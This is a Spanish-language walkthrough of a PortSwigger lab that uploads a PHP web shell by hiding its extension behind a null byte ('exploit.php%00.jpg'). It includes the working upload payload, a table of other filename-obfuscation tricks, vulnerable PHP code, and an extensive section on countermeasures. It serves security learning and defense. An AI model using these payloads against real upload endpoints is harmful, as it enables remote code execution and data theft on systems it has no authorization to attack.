# Writeup: Web shell upload via obfuscated file extension (PortSwigger)

- **Lab**: Web shell upload via obfuscated file extension
- **URL**: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
- **Categoría**: File upload / Extension obfuscation / Null byte / Web shell / RCE
- **Dificultad**: Practitioner
- **Credenciales**: `wiener:peter`

---

## 1. Objetivo

Mismo target (`/home/carlos/secret`), mismo endpoint (`/my-account/avatar`). La defensa: blacklist de extensiones PHP **más** bloqueo de `.htaccess` (cierra el bypass del lab anterior). Bypass: obfuscar la extensión con un null byte para que el validador la lea como `.jpg` pero el filesystem la trunque en `\0` y la guarde como `.php`.

Payload final:

```
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Después del upload, el archivo aterriza en `/files/avatars/exploit.php` (truncado en el null byte). Navegar ahí ejecuta el PHP.

### Insight central

**Validar el filename por sufijo es validar la representación textual; el OS opera sobre la representación de bytes**. El validador parsea la extensión como string (último `.` hasta el final → `.jpg`), pero el filesystem trata `\0` como terminador de string y guarda solo lo que está antes. Mismo antipatrón que el lab "validate file extension with null byte bypass" del cluster Path Traversal — la diferencia entre el modelo de string del lenguaje (length-prefixed, soporta `\0` interno) y el modelo del filesystem (null-terminated en C). Defensa correcta: filename completamente server-controlled (rename a UUID), eliminando toda la familia de obfuscaciones.

---

## 2. Recon y resolución

### 2.1 Diagnosticar la defensa

Login `wiener:peter`. Crear `exploit.php`. Subir directo: rechazado con "Sorry, php files are not allowed" (igual al lab anterior). Probar `.htaccess` para repetir el bypass del lab anterior: también rechazado. La blacklist se expandió.

Probable implementación del filter:

```php
$blacklist = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phar', 'pht', 'htaccess'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (in_array($ext, $blacklist)) {
    die("Sorry, ... files are not allowed");
}
```

`pathinfo($filename, PATHINFO_EXTENSION)` devuelve el sufijo después del último `.`. Si pasamos `exploit.php%00.jpg`, después del decode el filename es `exploit.php\0.jpg`, y `pathinfo` lo procesa como string Python/PHP — el `\0` es char válido, la extensión leída es `.jpg`. Pasa la blacklist.

### 2.2 Bypass con null byte

```
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Trace:
- **Wire**: `exploit.php%00.jpg`.
- **URL-decode (framework)**: `exploit.php\0.jpg`.
- **Validación**: `pathinfo` ve la extensión `.jpg` (todo después del último `.` literal en el string). Pasa la blacklist.
- **`move_uploaded_file()` / syscall del kernel**: la libc trata `\0` como terminador. El path efectivo en el filesystem es `exploit.php`. Se guarda con esa extensión.
- **Apache sirve `/files/avatars/exploit.php`**: lo procesa con el motor PHP. Ejecuta. Devuelve el secret.

Server responde 200 OK. Navegar a `/files/avatars/exploit.php` (sin el `%00.jpg`, eso ya no está en el filename real) devuelve el secret. Lab solved.

### 2.3 Diferencia entre representación textual y de bytes

El bypass se entiende mejor mirando los bytes:

```
Filename string en PHP/Python (length-prefixed): "exploit.php\x00.jpg"  (longitud 16)
Pathinfo lee: ext = ".jpg" (tres bytes después del último '.')
Validación: ".jpg" in blacklist? No. Pasa.

Path bytes pasados al kernel via libc: 'e','x','p','l','o','i','t','.','p','h','p','\0','.','j','p','g'
libc lee hasta '\0'. Path efectivo: "exploit.php" (11 bytes).
Filesystem guarda: exploit.php
```

La validación opera en la zona [0, 16] del string. El filesystem opera en la zona [0, 11]. La discrepancia es el bypass.

---

## 3. Por qué funciona

### 3.1 Anatomía del bug

```php
// Antipatrón - validar extension via pathinfo, sin sanitizar null bytes
$blacklist = ['php', 'phtml', 'php3', 'php4', 'php5', 'phar', 'pht', 'htaccess'];
$filename = $_FILES['avatar']['name'];  // 'exploit.php\0.jpg'

$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));  // 'jpg'
if (in_array($ext, $blacklist)) {
    die("Sorry, $ext files are not allowed");
}

// move_uploaded_file pasa el filename a la libc, que para en \0
move_uploaded_file($_FILES['avatar']['tmp_name'], '/var/www/files/avatars/' . $filename);
// El archivo se escribe en '/var/www/files/avatars/exploit.php'
```

Tres componentes del bug:

1. **Validación opera sobre el string completo** (PHP soporta `\0` interno en strings). `pathinfo` retorna la extensión post-último-punto, que es `jpg`.
2. **Filesystem opera sobre bytes hasta `\0`**. La libc/kernel para de leer el path al encontrar `\0`. El archivo se crea con el path truncado.
3. **El path efectivo difiere del path validado**. La defensa aprueba `exploit.php\0.jpg` (extensión `.jpg`); el OS guarda `exploit.php` (extensión `.php`).

Es el mismo antipatrón "validar antes de la transformación final" que aparece en el cluster Path Traversal y en el lab "Content-Type restriction bypass" — el server toma una decisión de seguridad sobre una representación intermedia del input que difiere de la representación que termina ejecutándose.

### 3.2 Otras técnicas de obfuscación de extensión

El null byte es la más confiable, pero hay variantes según la implementación del validador:

| Técnica | Filename | Validador ve | OS / Apache ve |
|---|---|---|---|
| Null byte | `exploit.php%00.jpg` | `.jpg` | `exploit.php` |
| Doble extensión | `exploit.php.jpg` | `.jpg` | varía (Apache `mod_mime` puede ejecutar como PHP) |
| Trailing dot | `exploit.php.` | `.` (vacía) | `exploit.php` (algunos FS strippean trailing dot) |
| Trailing space | `exploit.php ` | `.php ` (con espacio) | `exploit.php` (Windows strippea trailing space) |
| Caracteres invisibles | `exploit.php` + `​` | varía | varía |
| Case manipulation | `exploit.pHp` | `.pHp` | depende del filesystem y config: ext4 case-sensitive, NTFS case-insensitive, Apache `<FilesMatch>` puede normalizar |
| Magic bytes spoof | `GIF89a;<?php ...` con `.gif` | `.gif`, magic OK | bypass específico de magic-byte check |

El null byte es el bypass canónico porque ataca la diferencia fundamental de modelo de string entre lenguajes managed y C. Las otras dependen de quirks específicos del filesystem o del server. Stacks modernos cierran null byte (Python 3, Java 7u40+, PHP 5.3.4+) — pero PortSwigger emula un stack vulnerable.

### 3.3 Doble extensión y `mod_mime` mal configurado

Variante interesante que merece detalle: `exploit.php.jpg`.

Apache `mod_mime` procesa extensiones de **derecha a izquierda** buscando la última que tenga handler mapeado. El bug histórico (Apache 2.x con `AddHandler application/x-httpd-php .php` en lugar de `AddType`): si el archivo es `exploit.php.jpg` y `.jpg` no tiene handler asociado, Apache retrocede y encuentra `.php`, ejecutando como PHP. En Apache moderno con `AddType` correcto, el archivo se sirve como `image/jpeg` (la última extensión reconocida define el tipo). Variante legacy:

```apache
AddHandler application/x-httpd-php .php
```

El bug se conoce como **Apache double extension RCE**. PortSwigger no lo usa para este lab — el null byte fue suficiente.

### 3.4 ¿Por qué el null byte sigue funcionando en este lab pese a stacks modernos?

PortSwigger emula un stack vulnerable a null bytes (PHP < 5.3.4). En la práctica hoy:

- PHP ≥ 5.3.4: rechaza null bytes en filesystem APIs. Bug class cerrada.
- Java 7 con patch posterior (~2013-2014, versión exacta por vendor): `InvalidPathException`. Cerrado.
- Python 3: `ValueError: embedded null byte`. Cerrado.
- Ruby ≥ 1.9, Node moderno: cerrados.

Donde sigue apareciendo:
- Apps PHP legacy sin updates desde 2010.
- Code paths que pasan filename a binarios externos (subprocess, `exec`).
- Librerías nativas C/C++ sin wrapper que valide.
- Sistemas embebidos o con runtimes recortados.

### 3.5 Defensa correcta

```php
// Fix - filename server-controlled + whitelist + magic bytes
$allowed_ext = ['jpg', 'jpeg', 'png'];

$client_ext = strtolower(pathinfo($_FILES['avatar']['name'], PATHINFO_EXTENSION));
if (!in_array($client_ext, $allowed_ext)) {
    die("File type not allowed");
}

// Magic bytes - el contenido real, no el filename
$mime = mime_content_type($_FILES['avatar']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png'])) {
    die("File type not allowed");
}

// Null byte check explicito (defensa-en-profundidad)
if (strpos($_FILES['avatar']['name'], "\0") !== false) {
    die("Invalid filename");
}

// Filename completamente server-controlled
$new_name = bin2hex(random_bytes(16)) . '.' . $client_ext;
move_uploaded_file($_FILES['avatar']['tmp_name'], '/var/www/files/avatars/' . $new_name);
```

5 capas:
1. **Whitelist** (no blacklist) — falla cerrada para extensiones desconocidas.
2. **Magic bytes** — el contenido real del archivo.
3. **Rechazar null bytes explícitamente** — defensa-en-profundidad incluso en stacks que ya validan.
4. **Filename server-controlled (rename a UUID)** — la capa más fuerte. Cierra todas las obfuscaciones de filename porque el filename del cliente no se usa para nada del path final.
5. **Config del server**: deshabilitar ejecución en el directorio de uploads.

La capa 4 es la que cierra estructuralmente toda la familia. Una vez que el filename del cliente solo se usa como metadata informativa (no como path), las obfuscaciones (null byte, doble extensión, trailing dots, encoding) dejan de tener efecto.

### 3.6 Patrón estructural común con los labs anteriores del cluster

| Lab | Defensa naïve | Bypass | Asunción rota |
|---|---|---|---|
| `rce-via-web-shell-upload` | ninguna | `exploit.php` | (no hay defensa) |
| `content-type-restriction-bypass` | validar `Content-Type` del part | header → `image/jpeg` | "Content-Type del cliente describe tipo real" |
| `path-traversal` | strip `../` + dir sin scripts | `..%2fexploit.php` | "filename describe nombre, no path" |
| `extension-blacklist-bypass` | blacklist comprensiva PHP | `.htaccess` + `.l33t` | "extensiones ejecutables son conjunto fijo" |
| **`obfuscated-file-extension` (este)** | blacklist + bloqueo `.htaccess` | `exploit.php%00.jpg` | "validar extensión del string = validar extensión del path final" |

5 asunciones rotas, una sola defensa correcta (whitelist + magic bytes + filename server-controlled + dir sin scripts). El cluster es un catálogo de "qué representación del input la defensa mira vs cuál el sistema ejecuta".

---

## 4. Resumen

```mermaid
flowchart LR
    A[1. exploit.php - rechazado: 'php files not allowed']
    B[2. .htaccess - rechazado tambien: blacklist expandida]
    C[3. Estrategia: obfuscar la extension PHP]
    D[4. Probar exploit.php%00.jpg]
    E[5. Validador ve .jpg, pasa]
    F[6. Filesystem trunca en \0, guarda como exploit.php]
    G[7. GET /files/avatars/exploit.php]
    H[8. Apache ejecuta como PHP]
    I[9. Body = secret - lab solved]

    A --> B --> C --> D --> E --> F --> G --> H --> I
```



Tres ideas:

1. **Validar extensión por string ≠ validar extensión del path final**: el validador opera sobre la representación textual del filename (PHP/Python soportan `\0` interno como char válido); el filesystem opera sobre bytes hasta `\0` (semántica de string en C). La diferencia entre los dos modelos es el bypass.
2. **Null byte es el bypass canónico de obfuscación**: ataca la diferencia fundamental de modelo de string entre lenguajes managed y C. Variantes (doble extensión, trailing dots/spaces, case manipulation) dependen de quirks específicos del stack; null byte es estructural.
3. **Filename server-controlled cierra TODA la familia de obfuscaciones**: rename a UUID/hash ignorando filename del cliente convierte cualquier obfuscación en irrelevante porque el filename del cliente no se usa para el path final. Defensa estructuralmente más fuerte que cualquier filter sobre el filename.

---

## 5. Contramedidas

1. **Filename server-controlled (rename a UUID/hash)**: la defensa estructural más fuerte. Cierra null byte, doble extensión, trailing chars, case manipulation, path traversal, `.htaccess`/`web.config`, dotfiles. El filename del cliente solo se usa como metadata informativa.
2. **Whitelist de extensiones permitidas** (no blacklist): falla cerrada para extensiones desconocidas. Más robusta cuando se actualiza el server (nuevos handlers PHP/JSP/etc no rompen la defensa).
3. **Magic bytes del contenido real**: detecta archivos masquerading. Independiente del filename y del Content-Type.
4. **Rechazar null bytes y caracteres de control en filenames**: defensa-en-profundidad incluso en stacks que ya validan. Falla rápido si llegan, antes de procesar.
5. **Mantener el stack actualizado**: PHP ≥ 5.3.4, Java 7 con patch de 2013-2014 en adelante, Python 3, Ruby ≥ 1.9, Node moderno cierran null bytes a nivel de stdlib. Stacks legacy son vulnerables hoy.
6. **Deshabilitar ejecución de scripts en TODO el árbol de uploads**: defensa-en-profundidad. `php_flag engine off`, `Options -ExecCGI`, `AddType text/plain .php .phtml .php5 .phar .pht`. En todo el subtree, no solo en el directorio inmediato.
7. **Almacenar uploads fuera del document root**: solución más robusta. Servir vía endpoint dedicado con Content-Type explícito; el web server nunca toca los archivos directamente.
8. **Tests automatizados con la suite del cluster**: por cada endpoint que acepte uploads, archivos con todas las obfuscaciones (`%00`, doble extensión, trailing dot, trailing space, case mixto, magic bytes spoof, `.htaccess`, `web.config`). Cualquier ejecución es bug.
9. **Code review checklist**: cualquier `pathinfo($filename, PATHINFO_EXTENSION)` o equivalente seguido de validación de seguridad (sin null byte check) es candidato a bug. Marcar.
10. **Mínimo privilegio del proceso**: el web server no debe poder leer fuera del directorio de assets.

---

## 6. Referencias

- PortSwigger Web Security Academy. (s.f.). *Lab: Web shell upload via obfuscated file extension*. https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension
- PortSwigger Web Security Academy. (s.f.). *File upload vulnerabilities*. https://portswigger.net/web-security/file-upload
- OWASP Foundation. (s.f.). *Embedding Null Code*. https://owasp.org/www-community/attacks/Embedding_Null_Code
- OWASP Foundation. (s.f.). *Unrestricted File Upload*. https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- OWASP Foundation. (s.f.). *File Upload Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- MITRE Corporation. (2024). *CWE-434: Unrestricted Upload of File with Dangerous Type*. https://cwe.mitre.org/data/definitions/434.html
- MITRE Corporation. (2024). *CWE-158: Improper Neutralization of Null Byte or NUL Character*. https://cwe.mitre.org/data/definitions/158.html
- MITRE Corporation. (2024). *CWE-626: Null Byte Interaction Error (Poison Null Byte)*. https://cwe.mitre.org/data/definitions/626.html
- MITRE Corporation. (2024). *ATT&CK Technique T1505.003: Server Software Component — Web Shell*. https://attack.mitre.org/techniques/T1505/003/
- swisskyrepo. (s.f.). *PayloadsAllTheThings — Upload Insecure Files*. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 10 (Attacking Back-End Components — File Upload Vulnerabilities).
- Inventario interno: [`inventario/04-explotacion/web/explotacion-fileupload.md`](../../../inventario/04-explotacion/web/explotacion-fileupload.md)
- Labs hermanos del cluster:
  - [`learning/portswigger/file-upload-rce-via-web-shell-upload/writeup.md`](../file-upload-rce-via-web-shell-upload/writeup.md)
  - [`learning/portswigger/file-upload-content-type-restriction-bypass/writeup.md`](../file-upload-content-type-restriction-bypass/writeup.md)
  - [`learning/portswigger/file-upload-path-traversal/writeup.md`](../file-upload-path-traversal/writeup.md)
  - [`learning/portswigger/file-upload-extension-blacklist-bypass/writeup.md`](../file-upload-extension-blacklist-bypass/writeup.md)
- Lab análogo en cluster Path Traversal (mismo antipatrón con null byte):
  - [`learning/portswigger/file-path-traversal-validate-file-extension-null-byte-bypass/writeup.md`](../file-path-traversal-validate-file-extension-null-byte-bypass/writeup.md)
